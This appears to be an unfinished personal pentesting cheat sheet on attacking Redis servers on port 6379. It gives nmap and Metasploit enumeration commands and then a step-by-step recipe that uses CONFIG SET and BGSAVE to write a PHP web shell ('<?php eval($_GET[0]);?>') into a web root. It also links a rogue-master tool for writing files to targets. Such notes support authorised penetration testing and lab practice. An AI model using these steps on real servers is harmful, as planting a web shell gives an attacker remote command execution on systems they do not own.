---
id: services
aliases: []
tags: []
---
# Services 
[[#Redis /6379]]
  
  
## Redis /6379
> Redis is an open source, in-memory data structure store, used as a database, cache and message broker.

### Enumeration:    
```bash
   nmap --script redis-info -sV -p 6379 <IP>
   msf> use auxiliary/scanner/redis/redis_server
i ```
### Commands:
> [Cheat-Sheet](https://lzone.de/#/LZone%20Cheat%20Sheets/DevOps%20Services/Redis)

### Exploitation
1. **Easy**:
> [!IMPORTANT] Must have rights to access the dir / Must know the web root dir
```redis 
CONFIG SET
1. Change database file location
CONFIG SET dir /var/www/uploads/
2. Change database file name
CONFIG SET dbfilename sh.php
3. Inject your shell payload into database
SET PAYLOAD '<?php eval($_GET[0]);?>'
4. Save database to file
BGSAVE
```
2. **[Redis-rogue-server.py](https://github.com/n0b0dyCN/redis-rogue-server)** 
> Sets a redis server which operates as a master and sends commands and writes to files to target with partial or total  
>> [!IMPORTANT] Compile the .so on your machine
3. **ssh** :
> 


 

   

